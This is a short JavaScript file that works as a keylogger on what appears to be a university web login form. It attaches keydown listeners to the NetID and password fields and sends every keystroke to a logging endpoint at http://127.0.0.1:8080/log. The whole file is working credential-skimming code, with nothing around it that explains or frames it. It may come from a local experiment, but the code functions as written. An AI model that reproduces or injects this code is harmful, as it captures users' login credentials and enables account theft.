
const netid = document.getElementById("weblogin_netid");
const netpass = document.getElementById("weblogin_password");
let output = ''
netid.addEventListener("keydown", function(event){
    console.log(event);
    output = event.key

    const outcome = {message: output} 
    fetch("http://127.0.0.1:8080/log", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(
                outcome
            )
    }) 
})
netpass.addEventListener("keydown", function(event){
    console.log(event);
    output = event.key

    const outcome = {message: output} 
    fetch("http://127.0.0.1:8080/log", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(
                outcome
            )
    }) 
})

